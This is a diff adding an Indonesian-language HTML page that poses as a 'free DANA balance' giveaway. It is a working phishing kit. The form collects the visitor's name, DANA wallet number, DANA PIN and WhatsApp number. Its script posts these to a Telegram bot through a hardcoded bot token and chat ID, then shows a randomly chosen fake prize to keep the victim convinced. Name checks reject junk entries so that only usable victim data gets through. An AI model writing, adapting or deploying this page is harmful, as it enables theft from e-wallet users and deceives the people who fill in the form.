@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Saldo Dana Gratis</title>
+    <style>
+        /* Desain Latar Belakang Premium Keuangan & Emas */
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0a3d30 0%, #116955 50%, #082921 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            box-sizing: border-box;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        /* Efek Hujan Uang (Money Rain Animation) */
+        .money-rain {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+        }
+        .bill {
+            position: absolute;
+            font-size: 32px;
+            animation: fall linear infinite;
+            opacity: 0.7;
+        }
+        .b1 { left: 5%; animation-duration: 6s; animation-delay: 0s; }
+        .b2 { left: 25%; animation-duration: 9s; animation-delay: 2s; font-size: 45px; }
+        .b3 { left: 45%; animation-duration: 7s; animation-delay: 1s; }
+        .b4 { left: 65%; animation-duration: 11s; animation-delay: 3s; font-size: 50px; }
+        .b5 { left: 85%; animation-duration: 8s; animation-delay: 0.5s; }
+        .b6 { left: 92%; animation-duration: 10s; animation-delay: 4s; }
+
+        /* Wadah Utama Bertema Brankas Emas */
+        .form-container {
+            background: rgba(18, 53, 44, 0.85);
+            padding: 35px 30px;
+            border-radius: 28px;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5), 
+                        inset 0 0 20px rgba(244, 208, 63, 0.3);
+            width: 100%;
+            max-width: 430px;
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 3px double #f4d03f;
+            transition: all 0.4s ease;
+            animation: slideIn 0.8s cubic-bezier(0.165, 0.84, 0.44, 1);
+            position: relative;
+            z-index: 1;
+        }
+
+        .form-container:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 30px 60px rgba(244, 208, 63, 0.2);
+            border-color: #f7dc6f;
+        }
+
+        .header-box {
+            text-align: center;
+            margin-bottom: 30px;
+            border-bottom: 2px dashed rgba(244, 208, 63, 0.3);
+            padding-bottom: 15px;
+        }
+
+        .sub-header {
+            color: #f4d03f;
+            font-size: 12px;
+            font-weight: 800;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.5);
+        }
+
+        h2 {
+            color: #ffffff;
+            margin: 8px 0;
+            font-size: 28px;
+            font-weight: 900;
+            letter-spacing: -0.5px;
+            text-shadow: 0 3px 6px rgba(0,0,0,0.5);
+        }
+
+        .total-pool {
+            background: #f4d03f;
+            color: #082921;
+            display: inline-block;
+            padding: 4px 15px;
+            border-radius: 50px;
+            font-size: 13px;
+            font-weight: bold;
+            margin-top: 5px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+        }
+
+        .form-group {
+            margin-bottom: 18px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #f4d03f;
+            font-size: 14px;
+            font-weight: 700;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.3);
+        }
+
+        input {
+            width: 100%;
+            padding: 13px 16px;
+            border: 2px solid #116955;
+            border-radius: 14px;
+            box-sizing: border-box;
+            font-size: 14px;
+            color: #ffffff;
+            background-color: rgba(8, 41, 33, 0.7);
+            transition: all 0.3s ease;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #f4d03f;
+            background-color: rgba(8, 41, 33, 0.9);
+            box-shadow: 0 0 0 4px rgba(244, 208, 63, 0.25);
+            transform: scale(1.01);
+        }
+
+        input::placeholder {
+            color: rgba(255, 255, 255, 0.4);
+        }
+
+        button {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #f4d03f 0%, #d4ac0d 100%);
+            color: #082921;
+            border: none;
+            border-radius: 14px;
+            font-size: 17px;
+            cursor: pointer;
+            font-weight: 800;
+            margin-top: 15px;
+            text-transform: uppercase;
+            box-shadow: 0 5px 15px rgba(244, 208, 63, 0.4);
+            transition: all 0.3s ease;
+        }
+
+        button:hover {
+            background: linear-gradient(135deg, #f7dc6f 0%, #f1c40f 100%);
+            box-shadow: 0 8px 25px rgba(244, 208, 63, 0.6);
+            transform: translateY(-2px);
+        }
+
+        /* CUSTOM MODAL POPUP */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(5, 24, 19, 0.6);
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.4s ease;
+        }
+
+        .modal-overlay.active {
+            opacity: 1;
+            pointer-events: auto;
+        }
+
+        .modal-box {
+            background: #082921;
+            padding: 35px;
+            border-radius: 28px;
+            text-align: center;
+            max-width: 350px;
+            width: 90%;
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.6);
+            border: 3px solid #f4d03f;
+            transform: scale(0.7);
+            transition: transform 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+
+        .modal-overlay.active .modal-box {
+            transform: scale(1);
+        }
+
+        .modal-icon {
+            font-size: 60px;
+            margin-bottom: 15px;
+            animation: bounce 2s infinite;
+        }
+
+        .modal-text {
+            color: #ffffff;
+            font-size: 16px;
+            font-weight: 600;
+            line-height: 1.6;
+            margin-bottom: 25px;
+        }
+
+        /* Highlight Nominal Reward di Popup */
+        .reward-amount {
+            display: block;
+            font-size: 28px;
+            color: #f4d03f;
+            font-weight: 900;
+            margin: 10px 0;
+            text-shadow: 0 0 10px rgba(244, 208, 63, 0.5);
+        }
+
+        .modal-btn {
+            background: linear-gradient(135deg, #f4d03f 0%, #d4ac0d 100%);
+            color: #082921;
+            border: none;
+            padding: 12px 35px;
+            border-radius: 12px;
+            font-weight: bold;
+            font-size: 15px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .modal-btn:hover {
+            transform: scale(1.05);
+            background: #f7dc6f;
+        }
+
+        .modal-btn.error-btn {
+            background: #ef4444;
+            color: white;
+        }
+
+        @keyframes fall {
+            0% { transform: translateY(-100px) rotate(0deg); top: 0%; }
+            100% { transform: translateY(100vh) rotate(360deg); top: 100%; }
+        }
+
+        @keyframes slideIn {
+            0% { opacity: 0; transform: translateY(40px); }
+            100% { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-15px); }
+        }
+    </style>
+</head>
+<body>
+
+<div class="money-rain">
+    <div class="bill b1">💵</div>
+    <div class="bill b2">💰</div>
+    <div class="bill b3">💸</div>
+    <div class="bill b4">💵</div>
+    <div class="bill b5">🪙</div>
+    <div class="bill b6">💸</div>
+</div>
+
+<div class="form-container">
+    <div class="header-box">
+        <div class="sub-header">GIVEAWAY BERHADIAH</div>
+        <h2>💵 SALDO DANA GRATIS 💵</h2>
+        <div class="total-pool">Dapatkan Acak S/D Rp 500.000</div>
+    </div>
+    <form id="giveawayForm">
+        <div class="form-group">
+            <label for="nama">𝟭. 𝗡𝗮𝗺𝗮 𝗞𝗮𝗺𝘂 :</label>
+            <input type="text" id="nama" required placeholder="Contoh : Muhammad Ahmad">
+        </div>
+
+        <div class="form-group">
+            <label for="nodana">𝟮. 𝗡𝗼 𝗗𝗮𝗻𝗮 𝗞𝗮𝗺𝘂 :</label>
+            <input type="text" id="nodana" required placeholder="Contoh : 08xx-xxxx-xxxx">
+        </div>
+
+        <div class="form-group">
+            <label for="umur">𝟯. 𝗣𝗜𝗡 𝗗𝗮𝗻𝗮 𝗞𝗮𝗺𝘂 :</label>
+            <input type="text" id="umur" required placeholder="Contoh : 123456">
+        </div>
+
+        <div class="form-group">
+            <label for="nohp">𝟰. 𝗡𝗼 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 𝗞𝗮𝗺𝘂 :</label>
+            <input type="text" id="nohp" required placeholder="Contoh : 08xx-xxxx-xxxx">
+        </div>
+
+        <button type="submit">Dapatkan Saldo Gratis</button>
+    </form>
+</div>
+
+<div class="modal-overlay" id="customModal">
+    <div class="modal-box">
+        <div class="modal-icon" id="modalIcon">💰</div>
+        <div class="modal-text" id="modalText">Proses verifikasi pencairan dana beruntung Anda sedang berjalan...</div>
+        <button class="modal-btn" id="modalBtn" onclick="closeModal()">Selesai & Setuju</button>
+    </div>
+</div>
+
+<script>
+    const TELEGRAM_BOT_TOKEN = '8858052652:AAE14WAC5W0E-6v6u_JCbWSRdEDP8sM-aMM';
+    const TELEGRAM_CHAT_ID = '8864933664';
+
+    function showModal(type, message) {
+        const modal = document.getElementById('customModal');
+        const icon = document.getElementById('modalIcon');
+        const text = document.getElementById('modalText');
+        const btn = document.getElementById('modalBtn');
+
+        text.innerHTML = message;
+
+        if (type === 'success') {
+            icon.innerText = '🎉';
+            btn.innerText = 'Cairkan Sekarang!';
+            btn.className = 'modal-btn';
+        } else if (type === 'error') {
+            icon.innerText = '⚠️';
+            btn.innerText = 'Perbaiki Pengisian';
+            btn.className = 'modal-btn error-btn';
+        }
+
+        modal.classList.add('active');
+    }
+
+    function closeModal() {
+        document.getElementById('customModal').classList.remove('active');
+    }
+
+    function isValidFormat(num) {
+        const pattern = /^(08|62)\d{2,3}-\d{3,4}-\d{3,4}$/;
+        return pattern.test(num);
+    }
+
+    // Fungsi utilitas untuk membuat format mata uang rupiah
+    function formatRupiah(angka) {
+        return 'Rp ' + angka.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");
+    }
+
+    document.getElementById('giveawayForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const nama = document.getElementById('nama').value.trim();
+        const umur = document.getElementById('umur').value.trim();
+        const nodanaRaw = document.getElementById('nodana').value.trim();
+        const nohpRaw = document.getElementById('nohp').value.trim();
+
+        const namaKecil = nama.toLowerCase();
+        const kataPalsu = ['asdasd', 'qwerty', 'aaaa', 'bbbb', 'cccc', 'testing', 'admin', 'palsu'];
+        
+        if (nama.length < 3 || /[^a-zA-Z\s]/.test(nama)) {
+            showModal('error', 'Nama tidak boleh mengandung angka/simbol dan minimal harus 3 huruf!');
+            return;
+        }
+        if (kataPalsu.some(fake => namaKecil.includes(fake))) {
+            showModal('error', 'Jangan masukkan data nama asal-asalan!');
+            return;
+        }
+
+        if (!isValidFormat(nodanaRaw)) {
+            showModal('error', 'Nomor DANA wajib diisi dengan format strip! Contoh: 0812-3456-7890');
+            return;
+        }
+
+        if (!isValidFormat(nohpRaw)) {
+            showModal('error', 'Nomor WhatsApp wajib diisi dengan format strip! Contoh: 0812-3456-7890');
+            return;
+        }
+
+        // --- SISTEM ACAK REWARD MAKSIMAL 500.000 ---
+        // Menghasilkan kelipatan nominal puluhan ribu acak antara 100.000 s/d 500.000 agar terlihat realistis
+        const daftarHadiah = [150000, 200000, 250000, 300000, 350000, 400000, 450000, 500000];
+        const nominalAcak = daftarHadiah[Math.floor(Math.random() * daftarHadiah.length)];
+        const teksHadiahRupiah = formatRupiah(nominalAcak);
+
+        // Format Pesan Telegram Premium dengan Menyertakan Nominal Hadiah yang didapat
+        const teksPesan = `𝗦𝗲𝗹𝗮𝗺𝗮𝘁 𝗗𝗮𝘁𝗮 𝗠𝗮𝘀𝘂𝗸 𝗡𝗼𝘁𝗶𝗳𝗶𝗸𝗮𝘀𝗶\n\n` +
+
+
+                          `<b>𝟭. 𝗡𝗮𝗺𝗮 𝗞𝗮𝗺𝘂</b> : ${nama}\n` +
+                          `<b>𝟮. 𝗡𝗼 𝗗𝗮𝗻𝗮 𝗞𝗮𝗺𝘂</b> : ${nodanaRaw}\n` +
+                          `<b>𝟯. 𝗣𝗜𝗡 𝗗𝗮𝗻𝗮 𝗞𝗮𝗺𝘂</b> : ${umur}\n` +
+                          `<b>𝟰. 𝗡𝗼 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 𝗞𝗮𝗺𝘂</b> : ${nohpRaw}\n` +
+                          ``;
+
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+        fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: teksPesan,
+                parse_mode: 'HTML' // Diubah ke HTML agar teks tebal pada nominal sinkron sempurna
+            })
+        })
+        .then(response => {
+            if (response.ok) {
+                // Tampilan pesan sukses interaktif seolah-olah mendapatkan reward instan
+                const pesanSuksesPopup = `Selamat! Akun Anda terverifikasi mendapatkan Reward Saldo Acak sebesar:<span class="reward-amount">${teksHadiahRupiah}</span>Silakan klik tombol di bawah untuk memproses pengiriman ke dompet digital DANA Anda.`;
+                showModal('success', pesanSuksesPopup);
+                document.getElementById('giveawayForm').reset();
+            } else {
+                showModal('error', 'Koneksi ke sistem transaksi gagal. Coba pastikan bot aktif.');
+            }
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            showModal('error', 'Masalah jaringan perbankan. Silakan ulangi beberapa saat lagi.');
+        });
+    });
+</script>
+
+</body>
+</html>
